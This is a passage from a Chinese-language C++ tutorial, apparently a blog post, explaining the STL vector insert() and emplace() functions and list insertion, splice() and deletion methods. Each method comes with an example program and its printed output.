class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; demo&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>&#125;;<br>    <span class="hljs-comment">//第一种格式用法</span><br>    demo.insert(demo.begin() + <span class="hljs-number">1</span>, <span class="hljs-number">3</span>);<span class="hljs-comment">//&#123;1,3,2&#125;</span><br>    <span class="hljs-comment">//第二种格式用法</span><br>    demo.insert(demo.end(), <span class="hljs-number">2</span>, <span class="hljs-number">5</span>);<span class="hljs-comment">//&#123;1,3,2,5,5&#125;</span><br>    <span class="hljs-comment">//第三种格式用法</span><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">array</span>&lt;<span class="hljs-keyword">int</span>,3&gt;test&#123; <span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span> &#125;;<br>    demo.insert(demo.end(), test.begin(), test.end());<span class="hljs-comment">//&#123;1,3,2,5,5,7,8,9&#125;</span><br>    <span class="hljs-comment">//第四种格式用法</span><br>    demo.insert(demo.end(), &#123; <span class="hljs-number">10</span>,<span class="hljs-number">11</span> &#125;);<span class="hljs-comment">//&#123;1,3,2,5,5,7,8,9,10,11&#125;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; demo.size(); i++) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; demo[i] &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">2</span> <span class="hljs-number">5</span> <span class="hljs-number">5</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span> <span class="hljs-number">10</span> <span class="hljs-number">11</span><br></code></pre></div></td></tr></table></figure><h4 id="emplace-函数"><a href="#emplace-函数" class="headerlink" title="emplace()函数"></a>emplace()函数</h4><p>emplace() 是 C++ 11 标准新增加的成员函数，用于在 vector 容器指定位置之前插入一个新的元素。emplace() 每次只能插入一个元素，而不是多个。</p><p>该函数的语法格式：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">iterator <span class="hljs-title">emplace</span> <span class="hljs-params">(const_iterator pos, args...)</span></span>;<br></code></pre></div></td></tr></table></figure><p>其中，pos 为指定插入位置的迭代器；args… 表示与新插入元素的构造函数相对应的多个参数；该函数会返回表示新插入元素位置的迭代器。<br>简单的理解 args…，即被插入元素的构造函数需要多少个参数，那么在 emplace() 的第一个参数的后面，就需要传入相应数量的参数。</p><p>例子：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; demo1&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>&#125;;<br>    <span class="hljs-comment">//emplace() 每次只能插入一个 int 类型元素</span><br>    demo1.emplace(demo1.begin(), <span class="hljs-number">3</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; demo1.size(); i++) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; demo1[i] &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">3</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span><br></code></pre></div></td></tr></table></figure><blockquote><p>既然 emplace() 和 insert() 都能完成向 vector 容器中插入新元素，那么谁的运行效率更高呢？<br>答案是 emplace()。</p></blockquote><p>区别代码：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">testDemo</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>    testDemo(<span class="hljs-keyword">int</span> num) :num(num) &#123;<br>        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;调用构造函数&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br>    testDemo(<span class="hljs-keyword">const</span> testDemo&amp; other) :num(other.num) &#123;<br>        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;调用拷贝构造函数&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br>    testDemo(testDemo&amp;&amp; other) :num(other.num) &#123;<br>        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;调用移动构造函数&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br>    testDemo&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-keyword">const</span> testDemo&amp; other);<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-keyword">int</span> num;<br>&#125;;<br>testDemo&amp; testDemo::<span class="hljs-keyword">operator</span>=(<span class="hljs-keyword">const</span> testDemo&amp; other) &#123;<br>    <span class="hljs-keyword">this</span>-&gt;num = other.num;<br>    <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;insert:&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;testDemo&gt; demo2&#123;&#125;;<br>    demo2.insert(demo2.begin(), testDemo(<span class="hljs-number">1</span>));<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;emplace:&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;testDemo&gt; demo1&#123;&#125;;<br>    demo1.emplace(demo1.begin(), <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br>insert:<br>调用构造函数<br>调用移动构造函数<br>emplace:<br>调用构造函数<br></code></pre></div></td></tr></table></figure><p>当拷贝构造函数和移动构造函数同时存在时，insert() 会优先调用移动构造函数。<br>可以看到，通过 insert() 函数向 vector 容器中插入 testDemo 类对象，需要调用类的构造函数和移动构造函数（或拷贝构造函数）；而通过 emplace() 函数实现同样的功能，只需要调用构造函数即可。<br>简单的理解，就是 emplace() 在插入元素时，是在容器的指定位置直接构造元素，而不是先单独生成，再将其复制（或移动）到容器中。因此，在实际使用中，推荐大家优先使用 emplace()。</p><hr><h3 id="三-list-添加（插入）元素"><a href="#三-list-添加（插入）元素" class="headerlink" title="三.list 添加（插入）元素"></a>三.list 添加（插入）元素</h3><p>list 模板类中，与“添加或插入新元素”相关的成员方法有如下几个：</p><blockquote><p>push_front()：向 list 容器首个元素前添加新元素；<br>push_back()：向 list 容器最后一个元素后添加新元素；<br>emplace_front()：在容器首个元素前直接生成新的元素；<br>emplace_back()：在容器最后一个元素后直接生成新的元素；<br>emplace()：在容器的指定位置直接生成新的元素；<br>insert()：在指定位置插入新元素；<br>splice()：将其他 list 容器存储的多个元素添加到当前 list 容器的指定位置处。</p></blockquote><p>以上这些成员方法中，除了 insert() 和 splice() 方法有多种语法格式外，其它成员方法都仅有 1 种语法格式。用法如下：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;list&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">list</span>&lt;<span class="hljs-keyword">int</span>&gt; values&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;;<br>    values.push_front(<span class="hljs-number">0</span>);<span class="hljs-comment">//&#123;0,1,2,3&#125;</span><br>    values.push_back(<span class="hljs-number">4</span>); <span class="hljs-comment">//&#123;0,1,2,3,4&#125;</span><br>    values.emplace_front(<span class="hljs-number">-1</span>);<span class="hljs-comment">//&#123;-1,0,1,2,3,4&#125;</span><br>    values.emplace_back(<span class="hljs-number">5</span>);  <span class="hljs-comment">//&#123;-1,0,1,2,3,4,5&#125;</span><br>   <br>    <span class="hljs-comment">//emplace(pos,value),其中 pos 表示指明位置的迭代器，value为要插入的元素值</span><br>    values.emplace(values.end(), <span class="hljs-number">6</span>);<span class="hljs-comment">//&#123;-1,0,1,2,3,4,5,6&#125;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> p = values.begin(); p != values.end(); ++p) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; *p &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">-1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span><br></code></pre></div></td></tr></table></figure><h4 id="insert-成员方法"><a href="#insert-成员方法" class="headerlink" title="insert()成员方法"></a>insert()成员方法</h4><p>insert() 成员方法的语法格式有 4 种。</p><table><thead><tr><th>语法格式</th><th>用法说明</th></tr></thead><tbody><tr><td>iterator insert(pos,elem)</td><td>在迭代器 pos 指定的位置之前插入一个新元素 elem，并返回表示新插入元素位置的迭代器。</td></tr><tr><td>iterator insert(pos,n,elem)</td><td>在迭代器 pos 指定的位置之前插入 n 个元素 elem，并返回表示第一个新插入元素位置的迭代器。</td></tr><tr><td>iterator insert(pos,first,last)</td><td>在迭代器 pos 指定的位置之前，插入其他容器（例如 array、vector、deque 等）中位于 [first,last) 区域的所有元素，并返回表示第一个新插入元素位置的迭代器。</td></tr><tr><td>iterator insert(pos,initlist)</td><td>在迭代器 pos 指定的位置之前，插入初始化列表（用大括号 { } 括起来的多个元素，中间有逗号隔开）中所有的元素，并返回表示第一个新插入元素位置的迭代器。</td></tr></tbody></table><p>演示用法：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;list&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;array&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">list</span>&lt;<span class="hljs-keyword">int</span>&gt; values&#123; <span class="hljs-number">1</span>,<span class="hljs-number">2</span> &#125;;<br>    <span class="hljs-comment">//第一种格式用法</span><br>    values.insert(values.begin() , <span class="hljs-number">3</span>);<span class="hljs-comment">//&#123;3,1,2&#125;</span><br>    <span class="hljs-comment">//第二种格式用法</span><br>    values.insert(values.end(), <span class="hljs-number">2</span>, <span class="hljs-number">5</span>);<span class="hljs-comment">//&#123;3,1,2,5,5&#125;</span><br>    <span class="hljs-comment">//第三种格式用法</span><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">array</span>&lt;<span class="hljs-keyword">int</span>, 3&gt;test&#123; <span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span> &#125;;<br>    values.insert(values.end(), test.begin(), test.end());<span class="hljs-comment">//&#123;3,1,2,5,5,7,8,9&#125;</span><br>    <span class="hljs-comment">//第四种格式用法</span><br>    values.insert(values.end(), &#123; <span class="hljs-number">10</span>,<span class="hljs-number">11</span> &#125;);<span class="hljs-comment">//&#123;3,1,2,5,5,7,8,9,10,11&#125;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> p = values.begin(); p != values.end(); ++p)<br>    &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; *p &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">3</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">5</span> <span class="hljs-number">5</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span> <span class="hljs-number">10</span> <span class="hljs-number">11</span><br></code></pre></div></td></tr></table></figure><p>不知道有没有人发现，同样是实现插入元素的功能，无论是 push_front()、push_back() 还是 insert()，都有以 emplace 为名且功能和前者相同的成员函数。这是因为，后者是 C++ 11 标准新添加的，在大多数场景中，都可以完全替代前者实现同样的功能。更重要的是，实现同样的功能，emplace 系列方法的执行效率更高。</p><h4 id="splice-成员方法"><a href="#splice-成员方法" class="headerlink" title="splice()成员方法"></a>splice()成员方法</h4><p>和 insert() 成员方法相比，splice() 成员方法的作用对象是其它 list 容器，其功能是将其它 list 容器中的元素添加到当前 list 容器中指定位置处。<br>splice() 成员方法的语法格式有 3 种。</p><table><thead><tr><th>语法格式</th><th>功能</th></tr></thead><tbody><tr><td>void splice (iterator position, list&amp; x);</td><td>position 为迭代器，用于指明插入位置；x 为另一个 list 容器。 此格式的 splice() 方法的功能是，将 x 容器中存储的所有元素全部移动当前 list 容器中 position 指明的位置处。</td></tr><tr><td>void splice (iterator position, list&amp; x, iterator i);</td><td>position 为迭代器，用于指明插入位置；x 为另一个 list 容器；i 也是一个迭代器，用于指向 x 容器中某个元素。 此格式的 splice() 方法的功能是将 x 容器中 i 指向的元素移动到当前容器中 position 指明的位置处。</td></tr><tr><td>void splice (iterator position, list&amp; x, iterator first, iterator last);</td><td>position 为迭代器，用于指明插入位置；x 为另一个 list 容器；first 和 last 都是迭代器，[fist,last) 用于指定 x 容器中的某个区域。 此格式的 splice() 方法的功能是将 x 容器 [first, last) 范围内所有的元素移动到当前容器 position 指明的位置处。</td></tr></tbody></table><p>list 容器底层使用的是链表存储结构，splice() 成员方法移动元素的方式是，将存储该元素的节点从 list 容器底层的链表中摘除，然后再链接到当前 list 容器底层的链表中。这意味着，当使用 splice() 成员方法将 x 容器中的元素添加到当前容器的同时，该元素会从 x 容器中删除。</p><p>演示用法：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;list&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//创建并初始化 2 个 list 容器</span><br>    <span class="hljs-built_in">list</span>&lt;<span class="hljs-keyword">int</span>&gt; mylist1&#123; <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> &#125;, mylist2&#123;<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>&#125;;<br>    <span class="hljs-built_in">list</span>&lt;<span class="hljs-keyword">int</span>&gt;::iterator it = ++mylist1.begin(); <span class="hljs-comment">//指向 mylist1 容器中的元素 2</span><br>   <br>    <span class="hljs-comment">//调用第一种语法格式</span><br>    mylist1.splice(it, mylist2); <span class="hljs-comment">// mylist1: 1 10 20 30 2 3 4</span><br>                                 <span class="hljs-comment">// mylist2:</span><br>                                 <span class="hljs-comment">// it 迭代器仍然指向元素 2，只不过容器变为了 mylist1</span><br>    <span class="hljs-comment">//调用第二种语法格式，将 it 指向的元素 2 移动到 mylist2.begin() 位置处</span><br>    mylist2.splice(mylist2.begin(), mylist1, it);   <span class="hljs-comment">// mylist1: 1 10 20 30 3 4</span><br>                                                    <span class="hljs-comment">// mylist2: 2</span><br>                                                    <span class="hljs-comment">// it 仍然指向元素 2</span><br>   <br>    <span class="hljs-comment">//调用第三种语法格式，将 [mylist1.begin(),mylist1.end())范围内的元素移动到 mylist.begin() 位置处                  </span><br>    mylist2.splice(mylist2.begin(), mylist1, mylist1.begin(), mylist1.end());<span class="hljs-comment">//mylist1:</span><br>                                                                             <span class="hljs-comment">//mylist2:1 10 20 30 3 4 2</span><br>   <br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;mylist1 包含 &quot;</span> &lt;&lt; mylist1.size() &lt;&lt; <span class="hljs-string">&quot;个元素&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;mylist2 包含 &quot;</span> &lt;&lt; mylist2.size() &lt;&lt; <span class="hljs-string">&quot;个元素&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-comment">//输出 mylist2 容器中存储的数据</span><br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;mylist2:&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> iter = mylist2.begin(); iter != mylist2.end(); ++iter) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; *iter &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br>mylist1 包含 <span class="hljs-number">0</span>个元素<br>mylist2 包含 <span class="hljs-number">7</span>个元素<br>mylist2:<span class="hljs-number">1</span> <span class="hljs-number">10</span> <span class="hljs-number">20</span> <span class="hljs-number">30</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">2</span><br></code></pre></div></td></tr></table></figure><hr><h3 id="四-list-删除元素"><a href="#四-list-删除元素" class="headerlink" title="四.list 删除元素"></a>四.list 删除元素</h3><table><thead><tr><th>成员函数</th><th>功能</th></tr></thead><tbody><tr><td>pop_front()</td><td>删除位于 list 容器头部的一个元素。</td></tr><tr><td>pop_back()</td><td>删除位于 list 容器尾部的一个元素。</td></tr><tr><td>erase()</td><td>该成员函数既可以删除 list 容器中指定位置处的元素，也可以删除容器中某个区域内的多个元素。</td></tr><tr><td>clear()</td><td>删除 list 容器存储的所有元素。</td></tr><tr><td>remove(val)</td><td>删除容器中所有等于 val 的元素。</td></tr><tr><td>unique()</td><td>删除容器中相邻的重复元素，只保留一份。</td></tr><tr><td>remove_if()</td><td>删除容器中满足条件的元素。</td></tr></tbody></table><p>常见函数就只是简单记录一下用法：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">list</span>&lt;<span class="hljs-keyword">int</span>&gt;values;<br>values.pop_front();<span class="hljs-comment">//删除当前容器中首个元素</span><br>values.pop_back(); <span class="hljs-comment">//删除当前容器最后一个元素</span><br>values.clear();<span class="hljs-comment">//清空容器，删除容器中所有的元素</span><br></code></pre></div></td></tr></table></figure><p>erase() 成员函数有以下 2 种语法格式：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">iterator <span class="hljs-title">erase</span> <span class="hljs-params">(iterator position)</span></span>;<br><span class="hljs-function">iterator <span class="hljs-title">erase</span> <span class="hljs-params">(iterator first, iterator last)</span></span>;<br></code></pre></div></td></tr></table></figure><p>利用第一种语法格式，可实现删除 list 容器中 position 迭代器所指位置处的元素。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;list&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">list</span>&lt;<span class="hljs-keyword">int</span>&gt;values&#123; <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> &#125;;<br>    <span class="hljs-comment">//指向元素 1 的迭代器</span><br>    <span class="hljs-keyword">auto</span> del = values.begin();<br>    <span class="hljs-comment">//迭代器右移，改为指向元素 2</span><br>    ++del;<br>    values.erase(del); <span class="hljs-comment">//&#123;1,3,4,5&#125;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> begin = values.begin(); begin != values.end(); ++begin)<br>    &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; *begin &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span><br></code></pre></div></td></tr></table></figure><p>利用第二种语法格式，可实现删除 list 容器中 first 迭代器和 last 迭代器限定区域内的所有元素（包括 first 指向的元素，但不包括 last 指向的元素）。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;list&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">list</span>&lt;<span class="hljs-keyword">int</span>&gt;values&#123; <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> &#125;;<br>    <span class="hljs-comment">//指定删除区域的左边界</span><br>    <span class="hljs-keyword">auto</span> first = values.begin();<br>    ++first;<span class="hljs-comment">//指向元素 2</span><br>    <span class="hljs-comment">//指向删除区域的右边界</span><br>    <span class="hljs-keyword">auto</span> last = values.end();<br>    --last;<span class="hljs-comment">//指向元素 5</span><br>    <span class="hljs-comment">//删除 2、3 和 4</span><br>    values.erase(first, last);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> begin = values.begin(); begin != values.end(); ++begin)<br>    &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; *begin &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span 